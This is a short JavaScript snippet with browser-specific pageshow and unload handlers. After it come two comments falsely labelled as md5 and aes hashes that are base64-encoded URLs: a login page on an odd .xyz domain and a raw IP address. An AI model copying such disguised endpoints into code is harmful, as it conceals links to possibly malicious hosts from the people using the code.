if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9tLmhiZmxycnRvdmd2YzU5Lnh5ei9pbmRleC91c2VyL2xvZ2luLmh0bWw=**//** aes:aHR0cDovLzE2LjE2Mi4xMDUuMTQ1**/